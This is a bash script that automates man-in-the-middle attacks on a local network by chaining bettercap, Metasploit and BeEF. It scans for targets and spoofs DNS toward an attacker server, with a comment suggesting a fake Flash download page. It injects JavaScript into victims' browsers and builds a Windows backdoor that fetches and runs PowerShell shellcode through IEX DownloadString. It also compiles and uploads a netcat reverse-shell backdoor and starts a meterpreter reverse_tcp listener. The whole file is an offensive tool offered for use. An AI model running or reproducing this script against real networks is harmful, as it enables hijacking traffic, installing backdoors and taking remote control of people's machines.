#!/bin/bash
# Create MITM attacks by combining bettercap, metasploit and beef. Optimized for OSX and Kali Linux. Requires bettercap, metasploit-framework & arp utilities.
# 2k16 ~antoniofrighetto

white=$'\033[0m'
green=$'\033[0;32m'
red=$'\033[0;31m'
yellow=$'\033[1;33m'
bettercap_on=false
bettercap_pid=$(ps -e | grep "[b]ettercap" | awk '{print $1}')

check_path() {
    local flag=0
    path=$(type -P /usr/share/"${1}") || path=$(type -P /usr/local/share/"${1}")
    if [[ ! $path ]]; then
        flag=1
        read -p "[${yellow}Y/n${white}] Could not locate ${1}. Wanna try find it? " answer
        if [[ ! $answer || $answer =~ ^[yY] ]]; then
            path=$(find / 2>/dev/null -type d -iname "${1}" | head -1)
            if [[ $path ]]; then
                flag=0
            fi
        fi
    fi
    echo "${path%/*}"
    return $flag
}

abort() {
    echo -e "[${red}-${white}] ${1:-Something went wrong}." >&2
    exit 255
}

scan_targets() {
    local flag=0
    counter=0
    while true; do
        if (( ! flag )); then
            echo -e "[${green}+${white}] Looking for available targets..." >/dev/tty
        else
            echo -e "[${green}+${white}] Looking for available targets with range $range..." >/dev/tty
        fi
        array=($(arp-scan "${1}" 2>/dev/null \
                | sed -n '/^[0-9]\{1,3\}\./,/^[[:blank:]]*$/p' \
                | grep '\S' \
                | while read line; do echo "[$counter] $line"; let counter++; done \
                | tee /dev/tty))
        if (( ! "${#array[@]}" )); then
            read -p "[${yellow}Y/n${white}] No devices were found. Want to repeat the search? " answer
            if [[ ! $answer || $answer =~ ^[yY] ]]; then
                continue
            fi
            echo -e "[${red}-${white}] No target selected."
            return 1
        fi
        first_ip_octet=$(echo "$localip" | cut -d'.' -f1)
        declare -a temp
        for i in "${!array[@]}"; do
            if [[ "${array[$i]}" == "$first_ip_octet"* ]]; then
                temp+=("${array[$i]}")
            fi
        done
        array=("${temp[@]}")
        unset temp
        read -p "Select targets number ([r]epeat search, [c]hange range IP, comma to separe targets): " answer
        if [[ $answer =~ ^[0-9]((,[0-9]){1,3})?$ ]]; then
            if [[ $answer == *","* ]]; then
                target_number=($(echo "$answer" | tr ',' '\n'))
                for i in "${!target_number[@]}"; do
                    if [[ "${array[@]}" =~ ${array[${target_number[$i]}]} ]]; then
                        target+="${array[${target_number[$i]}]}"
                        if (( i+1 < "${#target_number[@]}" )); then
                            target+=","
                        fi
                    else
                        echo -e "[${red}-${white}] No such target found."
                        return 1
                    fi
                done
            else
            if (( answer < "${#array[@]}" )); then
                    target="${array[$answer]}"
                else
                    echo -e "[${red}-${white}] No such target found."
                    return 1
                fi
            fi
            break
        elif [[ $answer == "c" ]]; then
            read -p "Insert range (/8, /16, /24): " range
            if [[ ! $range =~ ^(/(8|16|24))$ ]]; then
                echo -e "[${red}-${white}] Invalid range."
                return 1
            fi
            set -- "${1%%/*}${range}"
            flag=1
        elif [[ $answer == "r" ]]; then
            continue
        else
            echo -e "[${red}-${white}] Invalid target."
            return 1
        fi
    done
}

kill_bettercap() {
    kill -TERM "$bettercap_pid" &>/dev/null || abort
    echo -e "[${yellow}i${white}] Waiting..."
    sleep 2
    [[ -e "bettercap_log" ]] && rm bettercap_log || abort
    bettercap_on=false
}

dns_spoofing() {
    local flag=0
    local server_ip=""
    if [[ $bettercap_pid ]]; then
        read -p "[${yellow}Y/n${white}] bettercap is already up. Want to kill it? " answer
        if [[ ! $answer || $answer =~ ^[yY] ]]; then
            kill_bettercap
        else
            flag=1
        fi
    fi

    # You may want to lookup your own server to bring users to a fake AdobeFlashPlayer download webpage (or whatever)
    if (( ! flag )); then
        while [[ ! $server_ip ]]; do
            read -p "Hostname to spoof traffic to: " server_ip
            if [[ ! $server_ip =~ ^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3} ]]; then
                server_ip=$(nslookup "$server_ip" -timeout=5 2>/dev/null | awk '/^Name/{getline; print $2}' | head -1)
            fi
            [[ ! $server_ip ]] && echo -e "[${red}-${white}] Invalid hostname."
        done
        server_response=$(curl -Is --connect-timeout 4 "$server_ip" 2>/dev/null | head -1; exit "${PIPESTATUS[0]}")
        (( $? == 28 )) && abort "Aborting: Request timeout"
        [[ $server_response != *"OK"* ]] && echo -e "[${yellow}i${white}] Warning: Could not get HTTP/1.1 200 OK from server."
        filename="dns.conf"
        echo -e "$server_ip .*\.it \n$server_ip .*\.com" > $filename
        echo -e "[${green}+${white}] $filename properly created."
        scan_targets "$cidr_subnet" || return 1

        { bettercap -T "$target" --dns "$filename" --no-sslstrip --log bettercap_log & } || abort
        echo -e "[${green}+${white}] Executing bettercap in background (press ${yellow}?${white} for info)."
        bettercap_on=true
    fi
}

generate_payload() {
    local server_ip=""
    local port=""
    local options=("[${yellow}1${white}] Generate Windows payload."
                   "[${yellow}2${white}] Generate Unix netcat-based backdoor.")
    for i in "${options[@]}"; do echo -e "$i"; done
    read -p $'Select sub-option: \033[1m>\033[0m ' opt
    [[ $opt == "1" || $opt == "2" ]] && { [[ $opt == "1" ]] && win_payload=1 || win_payload=0; } || return 1

    if (( win_payload )); then
        echo -e "[${yellow}i${white}] Warning: payload will be targeted for Windows only..."
        echo -e "[${green}+${white}] Generating payload..."
        curl -s -o payload.ps1 "https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1" 2>/dev/null
        if [[ $OSTYPE == "darwin"* ]]; then
            apachectl start; mv payload.ps1 ~/Sites/
        else
            service apache2 start; mv payload.ps1 /var/www/html/
        fi
        cat <<-EOF > backdoor_win.c
#include<stdio.h>
int main()
{
    system("powershell.exe \"IEX ((New-Object Net.WebClient).DownloadString('http://$localip/payload.ps1'))\"");
    return 0;
}
EOF
        x86_64-w64-mingw32-gcc backdoor_win.c -o executable.exe || echo -e "[${red}-${white}] Could not compile windows backdoor..."
    else
        if [[ -e "backdoor.c" ]]; then
            read -p "Hostname to spawn reverse shell: " hostname
            read -p "Port: " port
            sed -i '' 's/$hostname/'"$hostname"'/;s/$port/'"$port"'/' backdoor.c
            clang backdoor.c -o executable || abort "Could not compile backdoor"
            echo -e "[${green}+${white}] Backdoor is at $PWD..."
            echo -e "[${yellow}i${white}] Execute it and run nc -kl $port on the server..."
            read -p "[${yellow}Y/n${white}] Wanna upload payload on the server? " answer
            if [[ ! $answer || $answer =~ ^[yY] ]]; then
                read -p "Hostname to upload Unix backdoor: " hostname
                cat executable | ssh root@$hostname 'cd /var/www/html; cat > executable'
            fi
        else
            echo -e "[${red}-${white}] Missing backdoor?!"
            return 1
        fi
    fi
}

launch_msfconsole() {
    local port=""
    read -p "Set LPORT (8080): " port
    if [[ ! ( $port && $port =~ [0-9] ) ]]; then
        port=8080
    fi
    read -p "Set PAYLOAD (windows/meterpreter/reverse_tcp): " payload
    if [[ ! $payload ]]; then
        payload="windows/meterpreter/reverse_tcp"
    fi
    cat <<-EOF > handler.rc
use exploit/multi/handler
set PAYLOAD $payload
set LHOST $localip
set LPORT $port
set ExitOnSession false
exploit -j -z
EOF
    "${packages_path[0]}"/msfconsole -r handler.rc 2>/dev/null || abort "Could not initialize msfconsole"
    echo -e "[${green}+${white}] Initializing msfconsole..."
    rm handler.rc
}

launch_beef() {
    local flag=0
    beef_pid=$(ps -e | grep "[b]eef" | awk '{print $1}')
    if [[ ! $beef_pid ]]; then
        { "${packages_path[1]}"/beef &>/dev/null & } || abort "Could not initialize beef"
        echo -e "[${green}+${white}] Initializing beef..."
        sleep 3
        echo -e "[${green}+${white}] beef server started at http://localhost:3000/ui/panel"
    else
        echo -e "[${yellow}i${white}] beef is already up at http://localhost:3000/ui/panel..."
    fi
    echo -e "[${green}+${white}] Trying to hook browsers..."
    scan_targets "$cidr_subnet" || return 1
    [[ $bettercap_pid ]] && kill_bettercap
    while [[ $flag ]]; do
        read -p "Enter js URL to continue with beef; js file absolute path or inline js code (within <script></script>) tags: " mode
        if [[ $mode == "/"* ]]; then
            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-path "$mode" &>/dev/null &
        elif [[ $mode == "<script>"* ]]; then
            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-data "$mode" &>/dev/null &
        elif [[ $mode =~ ([^:]+)://([^:/]+)(/.*) ]]; then
            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-url "$mode" &>/dev/null &
        else
            flag=1; echo -e "[${red}-${white}] Invalid mode."
        fi
    done

}

(( EUID )) && abort "Run as root"
hash ip 2>/dev/null || abort "Missing ip utility (brew install iproute2mac to install it)"
printf "\033c"
interface=$(ip route 2>/dev/null | grep "default" | awk '{print $5}')
[[ ! $interface ]] && abort "No interfaces up"

echo -e "[${yellow}i${white}] Checking packages..."
hash bettercap 2>/dev/null && hash arp-scan 2>/dev/null || abort "Missing bettercap or arp utilities"
is_kali=$(grep -w "ID" 2>/dev/null </etc/os-release | awk -F'=' '{print $2}')
[[ $is_kali == "kali" ]] && beef="beef-xss/beef" || beef="beef/beef" #Project is beef, but only on Kali is preinstalled as beef-xss
packages=("metasploit-framework/msfconsole" "$beef")
declare -a packages_path
{ for i in "${!packages[@]}"; do
    packages_path[$i]=$(check_path "${packages[$i]}")
done } && echo -e "[${green}+${white}] All OK." || echo -e "[${yellow}i${white}] Warning: missing packages..."

localip=$(ifconfig "$interface" | egrep "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk '{print $2}')
cidr_subnet=$(ip route show | awk '{print $3}' | sed -e 's/[0-9]\{1,3\}$/1\/24/;1q')

eval printf '%.s=' {1.."$(tput cols)"}
options=("[${yellow}1${white}] DNS spoofing."
         "[${yellow}2${white}] Hook browser and/or inject js."
         "[${yellow}3${white}] Create payloads and/or upload it on the server."
         "[${yellow}4${white}] Launch msfconsole session."
         "[${yellow}c${white}] Clear screen."
         "[${yellow}?${white}] Show this menu."
         "[${yellow}Q${white}] Quit.")
for i in "${options[@]}"; do echo -e "$i"; done

while true; do
    read -p $'Select option: \033[1m>\033[0m ' opt
    case "$opt" in
        1)      dns_spoofing && options=("${options[@]:0:4}"
                                         "[${yellow}5${white}] Show bettercap log."
                                         "[${yellow}6${white}] Kill bettercap."
                                         "${options[@]:4}");;
        2)      launch_beef;;
        3)      generate_payload || echo -e "[${red}-${white}] Invalid option.";;
        4)      launch_msfconsole;;
        5)      { [[ $bettercap_on == "true" ]] && cat bettercap_log; };;
        6)      { ([[ $bettercap_on == "true" ]] && [[ $bettercap_pid ]]) && kill_bettercap; unset options[4]; unset options[5]; };;
        [Qq])   echo -e "[${yellow}i${white}] Exiting..." && break;;
        c)      clear;;
        ?)      for i in "${options[@]}"; do echo -e "$i"; done;;
        *)      echo -e "[${red}-${white}] Invalid option.";;
    esac
done

exit 0
